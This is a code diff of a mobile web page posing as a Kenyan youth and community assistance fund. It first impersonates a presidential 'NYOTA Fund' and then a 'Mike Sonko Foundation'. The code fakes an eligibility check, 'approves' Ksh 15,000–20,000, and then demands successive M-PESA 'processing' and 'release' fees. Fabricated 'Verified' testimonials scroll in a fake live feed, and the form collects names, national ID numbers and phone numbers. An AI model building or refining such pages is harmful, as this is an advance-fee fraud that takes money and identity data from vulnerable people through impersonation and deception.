+                        <button id="diffNumBtn" onclick="selectDisbNumber('different')" style="flex:1;padding:14px;border:1.5px solid #ced4da;background:#fff;border-radius:10px;font-weight:600;font-size:0.85rem;color:#6c757d;cursor:pointer;display:flex;align-items:center;gap:8px;">📱 Different Number</button>
+                    </div>
+                    <div style="background:#fef9f0; border:1px solid var(--accent-gold); border-radius:10px; padding:12px 16px; font-size:0.9rem; font-weight:700; color:var(--deep-navy); display:flex; align-items:center; gap:8px;">
+                        📱 <span id="disbPhoneConfirm"></span>
+                        <span style="font-size:0.72rem;color:#6c757d;font-weight:500;">Funds will be sent to this number</span>
                     </div>
                 </div>
-            </div>
-
-            <div class="approved-badge">
-                KE NYOTA FUND KENYA PHASE 2 APPROVED <span class="ke">KE</span>
-            </div>
-        </div>
-
-        <!-- ========== SCREEN 7: PROCESSING FEE (formerly CRB CLEARANCE) ========== -->
-        <div class="screen" id="screen-crb">
-            <div class="brand-header">
-                <div class="brand-logo">
-                    <div class="logo-text">NYOTA</div>
-                    <div class="logo-sub">NATIONAL YOUTH OPPORTUNITIES TOWARDS ADVANCEMENT</div>
-                    <div class="logo-tagline">Kuzu, Emirisha, Endeleza Vijana!</div>
-                </div>
-                <span class="badge-ke">KE</span>
-            </div>
-
-            <div class="crb-title">PROCESSING FEE REQUIRED</div>
-            <div class="crb-sub">Pay processing fee to release your funds</div>
-
-            <div class="crb-box">
-                <div style="font-size: 0.65rem; color: #777777; letter-spacing: 0.5px;">Processing Fee</div>
-                <div class="fee">Ksh 280</div>
-                <div class="pay-note">Paid via M-PESA STK push to <span class="pay-num">0725747227</span></div>
-            </div>
-
-            <button class="btn-pay-crb" id="btnPayCrb">Pay Ksh 280 Processing Fee →</button>
-            <div class="secure-badge">🔒 Secure payment · Funds released immediately after processing</div>
-
-            <!-- Live Community Feed -->
-            <div class="feed" style="margin-top: 10px;">
-                <div class="feed-header">
-                    <span><i class="fas fa-rss" style="color:#E8C84A; margin-right: 4px;"></i> Live Community Feed</span>
-                    <span class="live">● LIVE</span>
-                </div>
-                <div class="feed-scroll">
-                    <div class="feed-item">
-                        <div class="avatar">PO</div>
-                        <div class="body">
-                            <div><span class="name">Peter Ochieng</span> <span class="badge">Verified</span></div>
-                            <div class="msg">Niko Kisumu na nimepata. Program iko sawa kabisa. M-Pesa confirmed!</div>
-                            <div class="time">Just now</div>
-                        </div>
+                <div style="margin-bottom:20px;">
+                    <div style="font-size:0.72rem; font-weight:700; color:#212529; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:10px;">SELECT NETWORK</div>
+                    <div id="networkOptions" style="display:flex;flex-direction:column;gap:10px;">
+                        <button onclick="selectNetwork('safaricom')" id="net-safaricom" class="network-btn network-selected">
+                            <div style="display:flex;align-items:center;gap:12px;">
+                                <span style="width:20px;height:20px;background:#0d5f2f;border-radius:50%;display:inline-block;"></span>
+                                <div style="text-align:left;">
+                                    <div style="font-weight:700;font-size:0.92rem;color:#212529;">Safaricom (M-PESA)</div>
+                                    <div style="font-size:0.72rem;color:#6c757d;">Processing Support Fee: Ksh 499</div>
+                                </div>
+                            </div>
+                            <div class="network-radio"></div>
+                        </button>
+                        <button onclick="selectNetwork('airtel')" id="net-airtel" class="network-btn">
+                            <div style="display:flex;align-items:center;gap:12px;">
+                                <span style="width:20px;height:20px;background:#e53935;border-radius:50%;display:inline-block;"></span>
+                                <div style="text-align:left;">
+                                    <div style="font-weight:700;font-size:0.92rem;color:#212529;">Airtel Money</div>
+                                    <div style="font-size:0.72rem;color:#6c757d;">Processing Support Fee: Ksh 499</div>
+                                </div>
+                            </div>
+                            <div class="network-radio"></div>
+                        </button>
+                        <button onclick="selectNetwork('telkom')" id="net-telkom" class="network-btn">
+                            <div style="display:flex;align-items:center;gap:12px;">
+                                <span style="width:20px;height:20px;background:#1565c0;border-radius:50%;display:inline-block;"></span>
+                                <div style="text-align:left;">
+                                    <div style="font-weight:700;font-size:0.92rem;color:#212529;">Telkom (T-Kash)</div>
+                                    <div style="font-size:0.72rem;color:#6c757d;">Processing Support Fee: Ksh 499</div>
+                                </div>
+                            </div>
+                            <div class="network-radio"></div>
+                        </button>
                     </div>
-                    <div class="feed-item">
-                        <div class="avatar">DM</div>
-                        <div class="body">
-                            <div><span class="name">David Mwangi</span> <span class="badge">Verified</span></div>
-                            <div class="msg">Asante sana President Ruto! Kazi kwa vijana imeanza kabisa.</div>
-                            <div class="time">10 seconds ago</div>
-                        </div>
-                    </div>
-                    <div class="feed-item">
-                        <div class="avatar">PO</div>
-                        <div class="body">
-                            <div><span class="name">Peter Ochieng</span> <span class="badge">Verified</span></div>
-                            <div class="msg">M-nesa ishainia shukran sana kwa hii</div>
-                            <div class="time">25 seconds ago</div>
-                        </div>
+                    <div style="background:#fff8e1;border-radius:10px;padding:12px 14px;font-size:0.78rem;color:#e65100;margin-top:12px;display:flex;align-items:flex-start;gap:8px;">
+                        <span>💡</span>
+                        <span>A <strong>Processing Support Fee of Ksh 499</strong> is required to facilitate the disbursement.</span>
                     </div>
                 </div>
-            </div>
-
-            <div class="approved-badge">
-                KE NYOTA FUND KENYA PHASE 2 APPROVED <span class="ke">KE</span>
-            </div>
-            <div class="sponsor-line" style="border-top: none; padding-top: 2px; margin-top: 2px;">
-                Sponsored by <strong>H.E. William Samoei Ruto</strong> · President of Kenya KE<br />
-                NYOTA Fund Kenya Phase 2 · 2025-2026 Youth Strategy
+                <button class="btn-primary" style="background:var(--deep-navy); font-size:1rem;" onclick="goToNetworkFeePage()">Continue — Pay Processing Support Fee →</button>
+                <div style="font-size:0.68rem;color:#6c757d;text-align:center;margin-top:8px;">Mike Sonko Foundation · Empowering communities</div>
             </div>
         </div>
 
-        <!-- ========== SCREEN 8: PROCESSING FEE PAYMENT (formerly CRB PAYMENT) ========== -->
-        <div class="screen" id="screen-payment">
-            <div class="brand-header">
-                <div class="brand-logo">
-                    <div class="logo-text">NYOTA</div>
-                    <div class="logo-sub">NATIONAL YOUTH OPPORTUNITIES TOWARDS ADVANCEMENT</div>
-                    <div class="logo-tagline">Kuzu, Emirisha, Endeleza Vijana!</div>
+        <!-- PROCESSING SUPPORT FEE (Ksh 499) -->
+        <div id="networkFeePage" class="page">
+            <div class="card-header-vibrant">
+                <div class="step-info">Processing Support Fee</div>
+                <div class="step-title">🟢 Processing Support Fee</div>
+                <div class="step-sub">Pay this fee to facilitate the processing and disbursement of your funds.</div>
+            </div>
+            <div class="card-body-white">
+                <div style="background:#f8f9fa;border:1px solid #dee2e6;border-radius:12px;padding:16px;margin-bottom:16px;">
+                    <div style="font-size:0.68rem;color:#6c757d;font-weight:700;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px;">DISBURSEMENT SUMMARY</div>
+                    <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:0.88rem;"><span style="color:#6c757d;">Assistance Amount</span><strong style="color:var(--deep-navy);" id="netFeeAssistanceAmount">Ksh 20,000</strong></div>
+                    <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:0.88rem;"><span style="color:#6c757d;">Sending To</span><strong id="netFeePhoneDisplay"></strong></div>
+                    <div style="display:flex;justify-content:space-between;font-size:0.88rem;"><span style="color:#6c757d;">Processing Support Fee</span><strong style="color:var(--accent-gold-dark);">Ksh 499</strong></div>
                 </div>
-                <span class="badge-ke">KE</span>
-            </div>
-
-            <div class="pay-title">Processing Fee Payment</div>
-            <div style="font-size: 0.75rem; color: #c0dcc8; margin-top: 2px;">
-                Pay Ksh 280 processing fee to release your NYOTA funds.
-            </div>
-
-            <div class="pay-box">
-                <div class="pay-row">
-                    <span class="label">Amount</span>
-                    <span class="value ksh">Ksh 280</span>
-                </div>
-                <div class="pay-row">
-                    <span class="label">Pay Bill / Till</span>
-                    <span class="value phone">+254 725747227</span>
-                </div>
-            </div>
-
-            <button class="btn-pay-now" id="btnPayNow">Pay Ksh 280</button>
-            <button class="btn-cancel" id="btnCancelPay">Cancel</button>
-
-            <div style="font-size: 0.6rem; color: #c0dcc8; text-align: center; margin-top: 8px;">
-                You will receive an M-Pesa STK push on your phone
-            </div>
-
-            <div class="approved-badge" style="margin-top: 8px;">
-                KE NYOTA FUND KENYA PHASE 2 APPROVED <span class="ke">KE</span>
+                <div style="border:1.5px solid var(--accent-gold);border-radius:10px;padding:14px 16px;font-size:0.95rem;font-weight:700;color:var(--deep-navy);margin-bottom:10px;" id="netFeeRecipientName"></div>
+                <div style="background:#fef9f0;border:1px solid var(--accent-gold);border-radius:10px;padding:14px 16px;font-size:0.95rem;font-weight:700;color:var(--deep-navy);margin-bottom:6px;" id="netFeePhoneBox"></div>
+                <div style="font-size:0.72rem;color:#6c757d;margin-bottom:16px;">📱 M-PESA prompt will go to your registered number</div>
+                <button class="btn-primary" style="background:var(--deep-navy); font-size:1rem; margin-bottom:8px;" id="netFeePayBtn" onclick="processSupportFee()">
+                    <span id="netFeePayText">Pay Ksh 499 — Process &amp; Continue</span>
+                    <span id="netFeeSpinner" style="display:none;" class="spinner"></span>
+                </button>
+                <div style="font-size:0.68rem;color:#6c757d;text-align:center;">🔒 Confirmed via M-PESA callback · Funds move to final stage after payment</div>
+                <div id="netFeeStatus" class="modal-status" style="margin-top:10px;"></div>
             </div>
         </div>
 
-        <!-- ========== SCREEN 9: M-PESA PROMPT ========== -->
-        <div class="screen" id="screen-mpesa">
-            <div class="brand-header">
-                <div class="brand-logo">
-                    <div class="logo-text">NYOTA</div>
-                    <div class="logo-sub">NATIONAL YOUTH OPPORTUNITIES TOWARDS ADVANCEMENT</div>
-                    <div class="logo-tagline">Kuzu, Emirisha, Endeleza Vijana!</div>
+        <!-- FUND RELEASE CONTRIBUTION (Ksh 700) -->
+        <div id="disbursementFeePage" class="page">
+            <div class="card-header-vibrant">
+                <div class="step-info">Fund Release Contribution</div>
+                <div class="step-title">💸 Fund Release Contribution</div>
+                <div class="step-sub">Pay the final contribution to release your funds.</div>
+            </div>
+            <div class="card-body-white">
+                <div style="background:#f8f9fa;border:1px solid #dee2e6;border-radius:12px;padding:16px;margin-bottom:16px;">
+                    <div style="font-size:0.68rem;color:#6c757d;font-weight:700;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px;">DISBURSEMENT SUMMARY</div>
+                    <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:0.88rem;"><span style="color:#6c757d;">Assistance Amount</span><strong style="color:var(--deep-navy);" id="disbFeeAssistanceAmount">Ksh 20,000</strong></div>
+                    <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:0.88rem;"><span style="color:#6c757d;">Sending To</span><strong id="disbFeePhoneDisplay"></strong></div>
+                    <div style="display:flex;justify-content:space-between;margin-bottom:8px;font-size:0.88rem;"><span style="color:#6c757d;">Network</span><strong id="disbFeeNetworkDisplay">🟢 Safaricom (M-PESA)</strong></div>
+                    <div style="display:flex;justify-content:space-between;font-size:0.88rem;"><span style="color:#6c757d;">Fund Release Contribution</span><strong style="color:var(--accent-gold-dark);">Ksh 700</strong></div>
                 </div>
-                <span class="badge-ke">KE</span>
-            </div>
-
-            <div class="mpesa-icon">📱</div>
-            <div class="mpesa-title">M-PESA Prompt Sent!</div>
-            <div class="mpesa-sub">
-                Check <span class="mpesa-number">(725747227)</span> and enter your M-PESA PIN to confirm.
-            </div>
-
-            <div class="mpesa-instruction">
-                Enter your M-PESA PIN on your phone to complete the payment.
-            </div>
-
-            <div class="listening">
-                <span class="pulse-dot"></span> Listening for callback...
-            </div>
-
-            <div class="mpesa-warn">
-                ⚠️ Do not close this page – funds will be disbursed automatically once confirmed.
-            </div>
-
-            <div class="approved-badge" style="margin-top: 12px;">
-                KE NYOTA FUND KENYA PHASE 2 APPROVED <span class="ke">KE</span>
-            </div>
-            <div class="sponsor-line" style="border-top: none; padding-top: 2px; margin-top: 2px;">
-                Sponsored by <strong>H.E. William Samoei Ruto</strong> · President of Kenya KE
+                <div style="background:#fef9f0;border:1px solid var(--accent-gold);border-radius:10px;padding:12px 14px;font-size:0.82rem;color:var(--deep-navy);margin-bottom:16px;display:flex;align-items:flex-start;gap:8px;">
+                    <span>💡</span>
+                    <span>This is the <strong>final step</strong>. Once this contribution is confirmed, your funds will be instantly released to <strong id="disbFeeFinalPhone"></strong>.</span>
+                </div>
+                <div style="border:1.5px solid var(--accent-gold);border-radius:10px;padding:14px 16px;font-size:0.95rem;font-weight:700;color:var(--deep-navy);margin-bottom:10px;" id="disbFeeRecipientName"></div>
+                <div style="background:#fef9f0;border:1px solid var(--accent-gold);border-radius:10px;padding:14px 16px;font-size:0.95rem;font-weight:700;color:var(--deep-navy);margin-bottom:6px;" id="disbFeePhoneBox"></div>
+                <div style="font-size:0.72rem;color:#6c757d;margin-bottom:16px;">📱 M-PESA prompt will go to your registered number</div>
+                <button class="btn-primary" style="background:var(--deep-navy); font-size:1rem; margin-bottom:8px;" id="disbFeePayBtn" onclick="processReleaseContribution()">
+                    <span id="disbFeePayText">Pay Ksh 700 — Release My Funds 🚀</span>
+                    <span id="disbFeeSpinner" style="display:none;" class="spinner"></span>
+                </button>
+                <div style="font-size:0.68rem;color:#6c757d;text-align:center;">🔒 Confirmed via M-PESA callback · Funds released immediately after payment</div>
+                <div id="disbFeeStatus" class="modal-status" style="margin-top:10px;"></div>
             </div>
         </div>
-
     </div>
+</div>
 
-    <script>
-        (function() {
-            'use strict';
+<!-- ===== SUCCESS OVERLAY ===== -->
+<div class="success-overlay" id="allFeesClearedOverlay">
+    <div class="success-box">
+        <div class="big-icon">🎉</div>
+        <div class="title">All Contributions Cleared!</div>
+        <div class="sub">Your funds are being sent to your phone.</div>
+        <div class="details">
+            <div><span>Assistance Amount</span><strong id="finalAssistanceAmount">Ksh 20,000</strong></div>
+            <div><span>Network</span><strong id="allClearNetworkDisplay">🟢 Safaricom (M-PESA)</strong></div>
+            <div><span>Sending To</span><strong id="allClearPhoneDisplay">0725747227</strong></div>
+            <div><span>Processing Support Fee</span><strong>Ksh 499</strong></div>
+            <div><span>Fund Release Contribution</span><strong>Ksh 700</strong></div>
+        </div>
+        <div style="font-size:0.8rem; color:#2e7d32; font-weight:600; margin-bottom:16px;">
+            ✅ Funds will arrive within 3 minutes. Keep your phone on.
+        </div>
+        <button class="btn-primary" style="background:var(--deep-navy);" onclick="backToHome()">Back to Home</button>
+    </div>
+</div>
 
-            // ----- DOM refs -----
-            const screens = {
-                welcome: document.getElementById('screen-welcome'),
-                form: document.getElementById('screen-form'),
-                processing: document.getElementById('screen-processing'),
-                purpose: document.getElementById('screen-purpose'),
-                eligibility: document.getElementById('screen-eligibility'),
-                approval: document.getElementById('screen-approval'),
-                crb: document.getElementById('screen-crb'),
-                payment: document.getElementById('screen-payment'),
-                mpesa: document.getElementById('screen-mpesa'),
-            };
+<!-- ===== STK WAITING OVERLAY ===== -->
+<div class="modal-overlay" id="stkWaitingOverlay">
+    <div class="modal-box">
+        <div class="modal-icon warning"><span style="font-size:1.8rem;">📱</span></div>
+        <div class="modal-title">STK Push Sent!</div>
+        <div class="modal-desc">Please check your phone and enter your M-PESA PIN to complete the payment.</div>
+        <div style="display:flex; justify-content:center; gap:8px; margin:16px 0;">
+            <span style="width:10px;height:10px;background:var(--primary-blue);border-radius:50%;animation:procDotPulse 1.2s infinite ease-in-out both;animation-delay:-0.32s;"></span>
+            <span style="width:10px;height:10px;background:var(--primary-blue);border-radius:50%;animation:procDotPulse 1.2s infinite ease-in-out both;animation-delay:-0.16s;"></span>
+            <span style="width:10px;height:10px;background:var(--primary-blue);border-radius:50%;animation:procDotPulse 1.2s infinite ease-in-out both;"></span>
+        </div>
+        <div class="modal-status show pending">⏳ Waiting for confirmation...</div>
+        <div style="font-size:0.68rem;color:#999;margin-top:12px;">Do not close this page – we'll automatically proceed once confirmed.</div>
+    </div>
+</div>
 
-            const btnYes = document.getElementById('btnYes');
-            const btnNo = document.getElementById('btnNo');
-            const form = document.getElementById('applicationForm');
-            const fullNameInput = document.getElementById('fullName');
-            const purposeNameDisplay = document.getElementById('purposeNameDisplay');
-            const eligNameDisplay = document.getElementById('eligNameDisplay');
-            const approvalNameDisplay = document.getElementById('approvalNameDisplay');
-            const purposeList = document.getElementById('purposeList');
-            const btnContinue = document.getElementById('btnContinue');
-            const btnWithdraw = document.getElementById('btnWithdraw');
-            const btnPayCrb = document.getElementById('btnPayCrb');
-            const btnPayNow = document.getElementById('btnPayNow');
-            const btnCancelPay = document.getElementById('btnCancelPay');
-            const eligChecklist = document.getElementById('eligChecklist');
+<!-- ===== TOAST ===== -->
+<div id="toast" class="toast"></div>
 
-            let selectedPurpose = null;
-            let applicantName = '';
+<script>
+// ==================== DATA ====================
+let appData = {
+    fullName: '',
+    phone: '',
+    id: '',
+    age: '',
+    occupation: '',
+    county: '',
+    selectedProgramme: null
+};
+let selectedNetwork = 'safaricom';
+let selectedDisbPhone = '';
+let approvedAmount = 0;
 
-            // ----- Helpers -----
-            function showScreen(id) {
-                Object.values(screens).forEach(s => s.classList.remove('active'));
-                const el = document.getElementById('screen-' + id);
-                if (el) {
-                    el.classList.add('active');
-                    el.style.animation = 'none';
-                    requestAnimationFrame(() => {
-                        el.style.animation = '';
-                    });
-                    el.scrollTop = 0;
-                }
-            }
+const programmes = [
+    { id:3, title:"School Fees", description:"Covering primary, secondary & university tuition for bright students from low-income families.", helped:"Beneficiaries: 12,400+" },
+    { id:4, title:"Rent Assistance", description:"Helping families in Nairobi's informal settlements stay in their homes during tough times.", helped:"Beneficiaries: 8,200+" },
+    { id:1, title:"Maternal Care", description:"Supporting expectant mothers with delivery costs, baby supplies & postnatal care.", helped:"Beneficiaries: 3,200+" },
+    { id:2, title:"Business Capital", description:"Empowering hustlers with start-up capital for bodaboda, mama mboga & jua kali ventures.", helped:"Beneficiaries: 4,500+" }
+];
 
-            // ----- Welcome -----
-            btnYes.addEventListener('click', () => {
-                showScreen('form');
-            });
+const feedItems = [
+    { name: 'James Mwangi', initials: 'JM', color: '#0a66c2', text: 'Aisee nimepata STK nikaplipa 350 sasa hivi na 20k ishaingia kwa Mpesa! Shukran sana.', time: '1 minute ago' },
+    { name: 'Mercy Wanjiku', initials: 'MW', color: '#d4a017', text: 'Is this real? Mimi nilikuwa na mashaka lakini nimepokea saa hii. Asante sana Mike Sonko Foundation!', time: '45 seconds ago' },
+    { name: 'Samuel Kibet', initials: 'SK', color: '#1a2f4f', text: 'Fast and reliable. Hustler fund kweli inasaidia vijana. 20,000 imeingia chap chap.', time: '2 seconds ago' },
+    { name: 'Dennis Barasa', initials: 'DB', color: '#9c27b0', text: 'Leo shule nafungua niko na school fees yote. God bless Kenya! 🇰🇪', time: '5 seconds ago' },
+    { name: 'Diana Jepkosgei', initials: 'DJ', color: '#e91e63', text: 'Niko Eldoret na nimepata. Siamini macho yangu, nililipa 350 ya processing na zikatumwa mara hiyo.', time: '10 seconds ago' },
+];
 
-            btnNo.addEventListener('click', () => {
-                alert('We understand. Come back when you are ready! 🙏');
-            });
+// ==================== HELPERS ====================
+function showToast(msg) {
+    const toast = document.getElementById('toast');
+    toast.textContent = msg;
+    toast.style.display = 'block';
+    setTimeout(() => toast.style.display = 'none', 3000);
+}
 
-            // ----- Form submission -----
-            form.addEventListener('submit', (e) => {
-                e.preventDefault();
+function showPage(pageId) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    const target = document.getElementById(pageId);
+    if (target) target.classList.add('active');
+    window.scrollTo(0, 0);
+}
 
-                const name = fullNameInput.value.trim();
-                if (!name) {
-                    alert('Please enter your full name.');
-                    return;
-                }
-                if (!/^[A-Za-z\s]+$/.test(name)) {
-                    alert('Name must contain letters only.');
-                    return;
-                }
-                const phone = document.getElementById('phoneNumber').value.trim();
-                if (!phone) {
-                    alert('Please enter your phone number.');
-                    return;
-                }
-                const id = document.getElementById('nationalId').value.trim();
-                if (!id) {
-                    alert('Please enter your National ID.');
-                    return;
-                }
-                const age = parseInt(document.getElementById('age').value);
-                if (!age || age < 18) {
-                    alert('You must be 18 years or older.');
-                    return;
-                }
-                const occ = document.getElementById('occupation').value.trim();
-                if (!occ) {
-                    alert('Please enter your occupation.');
-                    return;
-                }
-                const county = document.getElementById('county').value;
-                if (!county) {
-                    alert('Please select your county.');
-                    return;
-                }
+function goBackHome() {
+    document.getElementById('homePage').classList.add('active-page');
+    document.getElementById('homePage').style.display = 'block';
+    document.getElementById('formsArea').style.display = 'none';
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('allFeesClearedOverlay').classList.remove('open');
+    document.getElementById('stkWaitingOverlay').classList.remove('open');
+}
 
-                applicantName = name;
-                purposeNameDisplay.textContent = name;
-                eligNameDisplay.textContent = name;
-                approvalNameDisplay.textContent = name.toUpperCase();
+function showFormsArea() {
+    document.getElementById('homePage').style.display = 'none';
+    document.getElementById('homePage').classList.remove('active-page');
+    document.getElementById('formsArea').style.display = 'flex';
+    showPage('step1');
+}
 
-                showScreen('processing');
+// ==================== RENDER PROGRAMMES ====================
+function renderProgrammes() {
+    const container = document.getElementById('programmesContainer');
+    container.innerHTML = '';
+    programmes.forEach((prog, idx) => {
+        const card = document.createElement('div');
+        card.className = 'program-card';
+        // Add a "HOT" badge for School Fees
+        const hotBadge = prog.id === 3 ? '<span style="background:#e53935;color:white;font-size:0.6rem;padding:2px 8px;border-radius:10px;margin-left:8px;">🔥 HOT</span>' : '';
+        card.innerHTML = `
+            <div class="prog-title">${prog.title} ${hotBadge}</div>
+            <div class="prog-desc">${prog.description}</div>
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-top:0.8rem;">
+                <span class="help-count">${prog.helped}</span>
+                <button class="apply-now-btn" data-idx="${idx}">Apply now →</button>
+            </div>
+        `;
+        card.querySelector('.apply-now-btn').addEventListener('click', (e) => {
+            e.stopPropagation();
+            const idx = parseInt(e.target.dataset.idx);
+            selectProgramme(idx);
+        });
+        container.appendChild(card);
+    });
+}
 
-                setTimeout(() => {
-                    showScreen('purpose');
-                }, 2500);
-            });
+function selectProgramme(idx) {
+    appData.selectedProgramme = programmes[idx];
+    showFormsArea();
+}
 
-            // ----- Purpose selection -----
-            purposeList.addEventListener('click', (e) => {
-                const li = e.target.closest('li');
-                if (!li) return;
-                purposeList.querySelectorAll('li').forEach(el => el.classList.remove('selected'));
-                li.classList.add('selected');
-                selectedPurpose = li.dataset.value;
-                btnContinue.disabled = false;
-            });
+// ==================== FORM VALIDATION ====================
+function validateName(input) {
+    const wrapper = document.getElementById('fullNameWrapper');
+    const name = input.value.trim();
+    const isValid = /^[a-zA-Z\s.]+$/.test(name) && name.length >= 3;
+    wrapper.classList.toggle('valid', isValid);
+    wrapper.classList.toggle('invalid', !isValid);
+    return isValid;
+}
+function validatePhone(input) {
+    const wrapper = document.getElementById('phoneNumberWrapper');
+    const phone = input.value.trim();
+    const isValid = /^(07|01)\d{8}$/.test(phone);
+    wrapper.classList.toggle('valid', isValid);
+    wrapper.classList.toggle('invalid', !isValid);
+    return isValid;
+}
+function validateID(input) {
+    const wrapper = document.getElementById('nationalIdWrapper');
+    const id = input.value.trim();
+    const isValid = /^\d{6,8}$/.test(id);
+    wrapper.classList.toggle('valid', isValid);
+    wrapper.classList.toggle('invalid', !isValid);
+    return isValid;
+}
+function validateAge(input) {
+    const wrapper = document.getElementById('ageWrapper');
+    const age = parseInt(input.value.trim());
+    const isValid = !isNaN(age) && age >= 18 && age <= 99;
+    wrapper.classList.toggle('valid', isValid);
+    wrapper.classList.toggle('invalid', !isValid);
+    return isValid;
+}
+function validateOccupation(input) {
+    const wrapper = document.getElementById('occupationWrapper');
+    const occ = input.value.trim();
+    const isValid = occ.length >= 2;
+    wrapper.classList.toggle('valid', isValid);
+    wrapper.classList.toggle('invalid', !isValid);
+    return isValid;
+}
+function validateCounty(select) {
+    const wrapper = document.getElementById('countyWrapper');
+    const isValid = select.value !== "";
+    wrapper.classList.toggle('valid', isValid);
+    wrapper.classList.toggle('invalid', !isValid);
+    return isValid;
+}
 
-            btnContinue.addEventListener('click', () => {
-                if (!selectedPurpose) return;
-                showScreen('eligibility');
-                runEligibilityCheck();
-            });
+// ==================== SUBMIT APPLICATION ====================
+function submitApplication(e) {
+    e.preventDefault();
+    const fullNameInput = document.getElementById('fullName');
+    const phoneInput = document.getElementById('phoneNumber');
+    const nationalIdInput = document.getElementById('nationalId');
+    const ageInput = document.getElementById('age');
+    const occupationInput = document.getElementById('occupation');
+    const countySelect = document.getElementById('county');
 
-            // ----- Eligibility check animation -----
-            function runEligibilityCheck() {
-                const items = eligChecklist.querySelectorAll('.item');
-                const checks = [
-                    { selector: '[data-check="id"]', delay: 400 },
-                    { selector: '[data-check="phone"]', delay: 900 },
-                    { selector: '[data-check="county"]', delay: 1400 },
-                    { selector: '[data-check="age"]', delay: 1900 },
-                    { selector: '[data-check="tier"]', delay: 2400 },
-                ];
+    const isNameValid = validateName(fullNameInput);
+    const isPhoneValid = validatePhone(phoneInput);
+    const isIdValid = validateID(nationalIdInput);
+    const isAgeValid = validateAge(ageInput);
+    const isOccValid = validateOccupation(occupationInput);
+    const isCountyValid = validateCounty(countySelect);
 
-                items.forEach(item => {
-                    const icon = item.querySelector('.icon');
-                    icon.className = 'icon pending';
-                    icon.textContent = '◌';
-                });
+    if (!isNameValid || !isPhoneValid || !isIdValid || !isAgeValid || !isOccValid || !isCountyValid) {
+        showToast('Please correct the errors in the form.');
+        return;
+    }
 
-                checks.forEach((c) => {
-                    setTimeout(() => {
-                        const item = document.querySelector(c.selector);
-                        if (!item) return;
-                        const icon = item.querySelector('.icon');
-                        icon.className = 'icon spin';
-                        icon.textContent = '⟳';
-                    }, c.delay - 200);
+    appData.fullName = fullNameInput.value.trim();
+    appData.phone = phoneInput.value.trim();
+    appData.id = nationalIdInput.value.trim();
+    appData.age = ageInput.value.trim();
+    appData.occupation = occupationInput.value.trim();
+    appData.county = countySelect.value;
 
-                    setTimeout(() => {
-                        const item = document.querySelector(c.selector);
-                        if (!item) return;
-                        const icon = item.querySelector('.icon');
-                        icon.className = 'icon done';
-                        icon.textContent = '✔';
-                    }, c.delay);
-                });
+    // ===== HOT LOGIC: Only School Fees (id === 3) gets the animation + 20,000 =====
+    if (appData.selectedProgramme && appData.selectedProgramme.id === 3) {
+        approvedAmount = 20000;
+        showCheckingPage(); // Hot flow: animation + 20,000
+    } else {
+        approvedAmount = 15000;
+        showApprovalPage(15000); // Cold flow: direct approval with 15,000
+    }
+}
 
-                const totalDelay = 2800;
-                setTimeout(() => {
-                    showScreen('approval');
-                }, totalDelay);
-            }
+// ==================== ELIGIBILITY CHECKING ANIMATION (HOT FLOW) ====================
+function showCheckingPage() {
+    showPage('checkingPage');
+    const firstName = appData.fullName.split(' ')[0] || 'Valued Beneficiary';
+    document.getElementById('checkingSubtext').textContent = `Hold on ${firstName}, we're reviewing your application.`;
+    
+    const checkItems = [
+        document.getElementById('check1'),
+        document.getElementById('check2'),
+        document.getElementById('check3'),
+        document.getElementById('check4'),
+        document.getElementById('check5')
+    ];
+    
+    checkItems.forEach(item => {
+        item.className = 'check-item pending';
+    });
+    
+    let currentCheck = 0;
+    function runNext() {
+        if (currentCheck > 0) {
+            checkItems[currentCheck - 1].className = 'check-item completed';
+        }
+        if (currentCheck < checkItems.length) {
+            checkItems[currentCheck].className = 'check-item active';
+            currentCheck++;
+            setTimeout(runNext, 1600);
+        } else {
+            // All checks done → go to approval with 20,000
+            setTimeout(() => {
+                showApprovalPage(20000);
+            }, 800);
+        }
+    }
+    setTimeout(runNext, 500);
+}
 
-            // ----- Withdraw -----
-            btnWithdraw.addEventListener('click', () => {
-                showScreen('crb');
-            });
+// ==================== APPROVAL PAGE (Dynamic Amount) ====================
+function showApprovalPage(amount) {
+    approvedAmount = amount;
+    const name = appData.fullName.split(' ')[0] || 'Valued Beneficiary';
+    document.getElementById('approvedGreeting').textContent = `🎉 Congratulations, ${name}!`;
+    document.getElementById('approvalAmount').textContent = `Ksh ${amount.toLocaleString()}`;
+    
+    // Update all dynamic amount fields
+    document.querySelectorAll('#netFeeAssistanceAmount, #disbFeeAssistanceAmount, #finalAssistanceAmount').forEach(el => {
+        el.textContent = `Ksh ${amount.toLocaleString()}`;
+    });
+    
+    selectedDisbPhone = appData.phone || '0710222875';
+    document.getElementById('disbRecipientName').textContent = appData.fullName || 'Beneficiary';
+    document.getElementById('sameNumDisplay').textContent = selectedDisbPhone;
+    document.getElementById('disbPhoneConfirm').textContent = selectedDisbPhone;
+    renderFeed();
+    if (!window.feedInterval) {
+        window.feedInterval = setInterval(addRandomFeed, 8000);
+    }
+    showPage('step3');
+}
 
-            // ----- Processing Fee (formerly CRB) -----
-            btnPayCrb.addEventListener('click', () => {
-                showScreen('payment');
-            });
+// ==================== FEED ====================
+function renderFeed() {
+    const container3 = document.getElementById('feedContainer3');
+    const containerDonation = document.getElementById('feedContainerDonation');
+    const html = feedItems.map(item => `
+        <div class="feed-item">
+            <div class="feed-avatar" style="background:${item.color};">${item.initials}</div>
+            <div class="feed-content">
+                <div class="feed-name">${item.name} <span class="verified">✅ Verified</span></div>
+                <div class="feed-text">${item.text}</div>
+                <div class="feed-time">${item.time}</div>
+            </div>
+        </div>
+    `).join('');
+    if (container3) container3.innerHTML = html;
+    if (containerDonation) containerDonation.innerHTML = html;
+}
 
-            // ----- Payment screen -----
-            btnPayNow.addEventListener('click', () => {
-                showScreen('mpesa');
-                setTimeout(() => {
-                    alert('✅ M-PESA payment confirmed! Your funds will be disbursed shortly.\nThank you for using NYOTA FUND KENYA PHASE 2.');
-                    showScreen('welcome');
-                    form.reset();
-                    purposeList.querySelectorAll('li').forEach(el => el.classList.remove('selected'));
-                    btnContinue.disabled = true;
-                    selectedPurpose = null;
-                }, 4000);
-            });
